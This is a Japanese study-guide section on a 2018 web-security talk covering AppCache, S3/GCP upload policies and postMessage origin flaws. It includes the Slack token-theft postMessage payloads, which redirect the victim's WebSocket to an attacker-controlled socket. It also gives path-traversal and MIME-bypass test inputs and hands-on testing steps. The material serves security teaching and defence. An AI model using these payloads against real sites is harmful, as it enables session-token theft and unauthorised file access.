Rosénの補足（スライド130）: 「openerからの、他2つのpostMessage呼び出しの間に割り込むpostMessage」で、「自分の知る限りChromeだけがこれを許すようだ」。ブラウザによってメッセージイベントの配送順序に差があり、当時Chromeがこの割り込みを許していた。

> **どう守るか**: postMessageのハンドシェイクだけで信頼を固定してはいけない。**すべての受信メッセージで毎回 `event.origin` を完全一致で検証**し、`event.source` の同一性も確認する。オリジン判定を自作の正規表現で書かない（`URL` APIでホスト名を取り出して等値比較する）。`.replace` の単一置換や `.*` アンカーの甘さは、オリジン検証レビューの定番チェック項目にする。

---

## 5. ツール共有: postMessage-tracker とその「Speedbumps」

### 実戦でリスナーを探すときの障害

トーク末尾の「Tool share!」で、postMessage-trackerの実装上の障害（Speedbumps＝速度制限帯）が語られる。これは**実際のサイトでリスナーを探すときの落とし穴集**そのものだ（スライド131-141）。

**Problem 1: Function-wrapping**（スライド133-134）。Raven.js、Rollbar、Bugsnag、New Relic といったエラー監視ライブラリがリスナー関数を「ラップ」してしまい、真のリスナーが見えなくなる。解決策は「ラッパを見つけて飛び越える」。

**Problem 2: jQuery-wrapping**（スライド135-136）。jQueryもリスナーをラップし、バージョン間で挙動が違って厄介だ。ラップ後はこう見える。

```javascript
function(b){return typeof
_!==za&&_.event.triggered!==b.type?
_.event.dispatch.apply(a,arguments):void 0}
```

解決策は「jQueryオブジェクトの `._data` / `.expando` / `.events` のいずれかを使う」こと。これで真のリスナーが取り出せる。

**Problem 3: Anonymous functions**（スライド137-138）。無名関数はChromeの `Function.toString()` で取り出せず同定できない。せめて "tracked" として表示はする、という妥協。

### 拡張の完成形（2020年リリース）

トークでは「No :( I suck. "Soon"?（まだ。だめだな。"そのうち"？）」と未リリースだったが、拡張は**2020年5月に実リリース**された（ https://github.com/fransr/postMessage-tracker ）。READMEの要点。

- 現在ウィンドウのpostMessageリスナー数をインジケータ表示。**全サブフレーム**のリスナーを追跡。
- 短命のリスナーや、操作時にだけ有効化される隠れリスナーも追跡（Log URLオプションで発見に有効）。
- Raven / New Relic / Rollbar / Bugsnag / jQuery のラッパに対応し、"アンパック"して真のリスナーを表示する。
- 異なるウィンドウ間の通信を `diffwin` で追跡し、「メッセージ再送に使えるパス」でウィンドウを特定できる。
- 無名関数は `bound` 文字列として表示（Chromeが文字列化できないため）。

---

## 6. スライドに無い口頭パート: Slackトークン窃取

トーク告知文には「how he accessed private Slack tokens by using postMessage and WebSocket-reconnect（postMessageとWebSocket再接続でprivateなSlackトークンを奪う）」とあるが、この事例は**142枚のスライドに1枚も無い**。動画でのみ語られた口頭パートで、文字の原典はDetectifyブログ（2017-02-28、HackerOne #207170）にある。

TLDR（逐語）: 「悪意あるページで被害者のSlack WebSocketを攻撃者のWebSocketへ再接続させ、privateなSlackトークンを盗む。Slackは金曜に5時間で修正、報奨$3,000」。

手口の骨子はこうだ。SlackのWeb版のpostMessageリスナー `_receivePostedMessageFromChildWindow` が `evt.origin` / `evt.source` を検証していなかった。攻撃者は `reconnect_url` イベントでWebSocket URLを差し替え、`goodbye` イベントで既存接続を切断させ、再接続を攻撃者のsocketへ誘導する。WebSocketの初期化GETに含まれる `token`（`xoxs` トークン＝アカウント完全アクセス権）がダンプされる。

```javascript
// WebSocket URLを差し替える
b.postMessage({"origin_window_type":"incoming_call","message_type":"ms_msg","msg":{"reply_to":false,"type":"reconnect_url","url":"ws://your-socket-domain:9001/websocket/AAA"}}, "*")
// 2秒ごとにgoodbyeで切断
b.postMessage({"origin_window_type":"incoming_call","message_type":"ms_msg","msg":{"reply_to":false,"type":"goodbye"}}, "*")
```

Slackの修正は、送信元オリジンのホスト名を自ドメインと等値比較するものだった。

```javascript
verifyOriginUrl: function(originHref) {
    return TS.utility.url.getHostName(originHref) == window.location.hostname
},
```

> ### 📌 ここは自分で開いて読んでください
> **資料**: Hacking Slack using postMessage and WebSocket-reconnect to steal your precious token — https://labs.detectify.com/2017/02/28/hacking-slack-using-postmessage-and-websocket-reconnect-to-steal-your-precious-token/
> **なぜ**: 本執筆環境からは動画が取得できず、この事例はスライドPDFに無い。以下はアーカイブ経由で取得したブログ全文にもとづく。
> **読みどころ**:
> 1. Chrome DevToolsの Event Listeners からリスナーを見つけ、`_receivePostedMessageFromChildWindow` にたどり着く発見ワークフロー。
> 2. `/call/me` スラッグで任意ユーザーを狙えるようにした工夫。
> 3. `reconnect_url` + `goodbye` でWebSocketを再接続させる連鎖。
> **代替手段**: HackerOneレポート https://hackerone.com/reports/207170 。

---

## 手を動かす

以下は「自分で立てた検証環境」または「許可されたバグバウンティ対象」でのみ行うこと。他人のサイトへの無許可のテストは違法である。

1. **AppCacheのFALLBACK挙動を再現する**（歴史的学習として、AppCacheが動く古いブラウザ／エミュレータで）。深いパスにマニフェストを置き、`FALLBACK:` の左を `/` にして、ルートのページが代替表示されるか観察する。現行の主要ブラウザではAppCacheは削除済みなので、Herreraのミラー記事でNETWORKセクションの許可リスト挙動を読んで代替とする。

2. **アップロードポリシーを点検する**。自分のテストアプリで直接アップロード（S3署名POST／GCP署名URL）を実装し、返ってくるポリシーJSONを見る。`conditions` の中に `["starts-with","$key",""]` や `["starts-with","$Content-Type",""]` のような空指定が無いか確認する。あれば、キーに `evil.html`、Content-Typeに `text/html` を入れてアップロードが通るか試す。

3. **署名URL発行APIをファジングする**。`file_name` や `s3_key` に `../../../`、`/`、別ユーザーのパスを入れて、サーバが検証しているか確認する。返ったURLを `fetch` して他ファイルが読めないか確かめる。

4. **postMessageリスナーを探す**。Chromeで対象ページを開き、DevTools → Elements → Event Listeners で `message` リスナーを探す。または postMessage-tracker 拡張を入れてインジケータを見る。見つけたら関数にブレークポイントを張り、コンソールから `frames[0].postMessage({...}, '*')` で任意メッセージを送って挙動を観察する。

5. **オリジン判定コードをレビューする**。見つけたリスナーのオリジン検証を読み、①`indexOf` の部分一致 ②正規表現の未エスケープなドット ③`.replace('.', '\\.')` の単一置換 ④`.*(...)$` の甘いアンカー、の4パターンが無いか点検する。

## つまずきポイント

- **AppCacheはもう主要ブラウザに無い**。本トークの攻撃そのものは現行ブラウザでは再現できない。学ぶべきは「仕様の曖昧さがバグを生む」構造と、Service Worker（ルート直下にJSを置けるかが鍵）への読み替えである。
- **`starts-with` は完全一致ではない**。`image/jpeg` に制限しても `image/jpegz;text/html` で回避される。プレフィクス一致とMIMEスニッフィングの組み合わせを甘く見ない。
- **オリジン検証を自作の正規表現で書くと必ず失敗する**。ドットのエスケープ漏れ、`.*` アンカー、`.replace` の単一置換は定番の穴。ホスト名を取り出して等値比較するのが正解。
- **ハンドシェイクの後は検証しない実装が多い**。INIT等の初回だけ検証してLOAD等の後続を素通しにすると、レースコンディションで乗っ取られる。**毎メッセージ検証**が原則。
- **エラー監視ライブラリ（Raven/Rollbar/Bugsnag/New Relic）とjQueryがリスナーをラップする**ので、素朴に探すと真のリスナーが見えない。`._data`/`.expando`/`.events` を使うか、postMessage-trackerに任せる。
- **Slack/prototype pollution/Zendeskはこのトークの題材ではない**。Slackは動画限定の口頭パートで原典は別ブログ。混同して「トークで語られた」と書かないこと。

## この節のまとめ

- 本トークのテーマは「Modern = stuff people use」＝最新技術ではなく**広く使われている枯れた機能**を狙う発想である。
- 実題材は **AppCache / アップロードポリシー(S3・GCP) / postMessage** の3系統。当時の聴講者ツイートとスライド第2ミラーで範囲が二重に裏付けられている。
- AppCache攻撃は「Cookie爆撃で全ページを500化 → FALLBACKを発火 → 深いパスのマニフェストでルート（名前空間 `/`）を乗っ取る」。仕様の曖昧な一文が全ブラウザ共通のバグを生んだ。Dropboxで$12,845＋ブラウザ報奨$3,000。
- 攻撃成立の4条件は「HTTPS必須／アップロードHTMLが実行される／サンドボックスドメインに置ける／共通ディレクトリ or ルート直下に置ける」。Service Workerはその強化版でルート直下にJSを置けることが鍵。
- AppCacheはChrome 67→70→85→93と段階的に削除され完全廃止。HerreraはNETWORKセクションの許可リスト挙動でXS-Leakを掘り、CVE 2件・$10,000。FALLBACKはsame-origin限定、NETWORKはクロスオリジンで効く。
- アップロードポリシーの弱点は `["starts-with","$key",""]`（任意ファイル差し替え）、`/` を含まないプレフィクス（ルート直下設置）、`$Content-Type` の空指定や継ぎ足し（HTML実行）。GCPは `file_name` 無検証で任意ファイル読み書き。合計~$15,000。
- 独自ポリシーロジックの自作は危険。パストラバーサル（`key=../../../`）、URL抽出正規表現のバイパス（`https://.x./example-beta`）、`s3_key:"/"` のロジック欠陥で全オブジェクトに到達される。
- postMessageの攻撃は「オリジン無検証」「弱いオリジン判定」に集約される。`indexOf` 部分一致、正規表現の未エスケープなドット、`.replace('.','\\.')` の単一置換、`.*(...)$` の甘いアンカーが定番の穴。
- ClickTale事例は「正規のサードパーティJSの設定機構（triggers/states/action）を読み解いて抽出ガジェットに変える」コードリーディング型攻撃。CookieやDOMを `dynamicEventName` に詰めて外部送出しCSRFトークンを盗む。
- クライアントサイドレースコンディションは「JSロードとiframeロードの間隙」「INITダンス中のLOAD連射」を突く。Stripe事例では攻撃者の公開鍵に差し替えて決済を乗っ取った。当時Chromeだけが割り込みを許した。
- 防御の原則は「毎メッセージで `event.origin` を完全一致検証」「オリジン判定を正規表現で自作しない」「アップロードは別オリジン/sandbox・Content-Type固定・nosniff」「ハンドシェイクだけで信頼を固定しない」。
- 動画（NDC Oslo版54:58）は本環境で取得できなかったため、読者自身で観る資料として案内する。postMessage系統は `https://youtu.be/oJCCOnF25JU?t=1094`（18:14）から観るのが効率的。

## 理解度チェック

1. AppCacheのFALLBACKを発火させるために、攻撃者はまず何をするか。
   ▶ 答え: Cookie爆撃（巨大なCookieを大量に撒く）で全ページを500エラーにし、正常応答が取れない状態を作ってFALLBACKを発火させる。

2. なぜAppCacheのFALLBACKパス逸脱バグが「全ブラウザ共通」だったのか。
   ▶ 答え: W3C仕様の「フォールバックはマニフェストと同じパスに」という記述が曖昧で、多くのブラウザが「フォールバック先URLのパス」だけを制約し、「フォールバック名前空間もマニフェストと同じパスに」というもう一文を実装し忘れたため。

3. `["starts-with","$Content-Type","image/jpeg"]` と制限されていても、なぜHTMLをアップロードできるのか。
   ▶ 答え: `starts-with` はプレフィクス一致しか見ないため、`image/jpegz;text/html` のように `image/jpeg` で始まるMIMEを詰めればブラウザのMIMEスニッフィングでHTML実行に持ち込める。

4. postMessageのオリジン判定で `0>a.origin.indexOf(MpElD)` が危険なのはなぜか。
   ▶ 答え: `indexOf` は部分一致なので、`link.com.example.com` のようにその文字列をどこかに含むだけのオリジンを攻撃者が用意すれば判定を通過できるから。

5. `".example.co.nz".replace('.', '\\.')` の結果はどうなり、なぜ問題か。
   ▶ 答え: `"\.example.co.nz"` となり、先頭のドットしかエスケープされない。文字列を渡すと最初の1個しか置換されないため、残りの `.` が正規表現のワイルドカードのままになり、`exampleaco.nz` のような攻撃者ドメインがマッチしてしまう。

6. Stripe決済乗っ取りで、攻撃者のLOADメッセージが「レースに勝つ」と何が起きるか。
   ▶ 答え: 決済iframeが攻撃者の公開鍵（`pk_diffkey`）でStripeをロードし、被害者のカード情報が攻撃者のStripeアカウントでトークン化される。攻撃者はそのトークンで任意金額を請求できる。

7. ClickTale事例で、任意のCookieやDOM値を外部送出できるのはどの機能を悪用するからか。
   ▶ 答え: action の `dynamicEventName`。`CookieValue`・`ElementValue`・`JSVariableValue` などの抽出ソースを指定してイベント名に連結し、ClickTaleの外部サーバへ送らせる。

8. 「ユーザーコンテンツを分離ドメインに置く」設計が、なぜpostMessageデータ横取りを許すことがあるか。
   ▶ 答え: 攻撃者も同じ分離ドメインにファイルを置けると、攻撃者ページとconverter iframeが同一オリジンになり、SOP上iframe内JSにアクセスできてしまうため。

9. 実サイトでpostMessageリスナーを探すとき、Raven/Rollbar/jQueryが邪魔になる理由と対処は。
   ▶ 答え: これらがリスナー関数をラップして真のリスナーを隠す。jQueryなら `._data`/`.expando`/`.events` を使う、またはラッパを飛び越える（postMessage-trackerが自動でアンパックする）。

10. 本トークで語られたが142枚のスライドに載っていない事例は何か。
    ▶ 答え: Slackトークン窃取（postMessage + WebSocket再接続）。動画限定の口頭パートで、原典はDetectifyブログ（2017-02-28）とHackerOne #207170。

## 出典

- https://speakerdeck.com/fransrosen/owasp-appseceu-2018-attacking-modern-web-technologies
- https://speakerd.s3.amazonaws.com/presentations/ded93ff7934f4dfa9d76399b8dff2a16/Appsec-Modern-copy.pdf
- https://www.youtube.com/watch?v=vRqcUS4CPFs
- https://www.youtube.com/watch?v=oJCCOnF25JU
- https://youtu.be/oJCCOnF25JU?t=1094
- https://github.com/fransr/postMessage-tracker
- https://labs.detectify.com/2017/02/28/hacking-slack-using-postmessage-and-websocket-reconnect-to-steal-your-precious-token/
- https://hackerone.com/reports/207170
- https://bugs.chromium.org/p/chromium/issues/detail?id=696806#c40
- https://speakerdeck.com/filedescriptor/exploiting-the-unexploitable-with-lesser-known-browser-tricks?slide=22
- https://www.w3.org/TR/2015/WD-html51-20150506/browsers.html#concept-appcache-manifest-fallback
- https://blog.mozilla.org/security/2018/02/12/restricting-appcache-secure-contexts/
- https://blog.lbherrera.me/posts/appcache-forgotten-tales/
- https://raw.githubusercontent.com/irsdl/webhacklist/HEAD/archived-references/md/2021/2021-blog-lbherrera-me-appcache-s-forgotten-tales.md
- https://raw.githubusercontent.com/irsdl/webhacklist/HEAD/archived-references/md/2018/2018-owasp-appsec-europe-attacking-modern-web-technologies-slides.md
- https://gist.github.com/lbherrera/6e549dcf49334b637c22d76518a90ff6
- https://hackerone.com/reports/207042

<!-- sources: https://speakerdeck.com/fransrosen/owasp-appseceu-2018-attacking-modern-web-technologies, https://www.youtube.com/watch?v=vRqcUS4CPFs, https://www.youtube.com/watch?v=oJCCOnF25JU, https://github.com/fransr/postMessage-tracker, https://labs.detectify.com/2017/02/28/hacking-slack-using-postmessage-and-websocket-reconnect-to-steal-your-precious-token/, https://bugs.chromium.org/p/chromium/issues/detail?id=696806#c40, https://blog.mozilla.org/security/2018/02/12/restricting-appcache-secure-contexts/, https://blog.lbherrera.me/posts/appcache-forgotten-tales/, https://gist.github.com/lbherrera/6e549dcf49334b637c22d76518a90ff6, https://hackerone.com/reports/207170 -->
<!-- terms: AppCache, FALLBACK, Cookie爆撃, Service Worker, アップロードポリシー, 署名付きポリシー, starts-with, パストラバーサル, postMessage, 同一オリジンポリシー, オリジン検証, クライアントサイドレースコンディション, INITダンス, postMessage-tracker, XS-Leak, MIMEスニッフィング, サンドボックスドメイン, ClickTale, dynamicEventName -->
<!-- self-read: https://www.youtube.com/watch?v=vRqcUS4CPFs | YouTubeがegressプロキシで全面ブロック（字幕API・アーカイブも403） -->
<!-- self-read: https://blog.lbherrera.me/posts/appcache-forgotten-tales/ | 原URLがサイト側制限で取得不可、ミラーで代替 -->
<!-- self-read: https://labs.detectify.com/2017/02/28/hacking-slack-using-postmessage-and-websocket-reconnect-to-steal-your-precious-token/ | スライド未収録の動画限定事例、原典はブログ -->
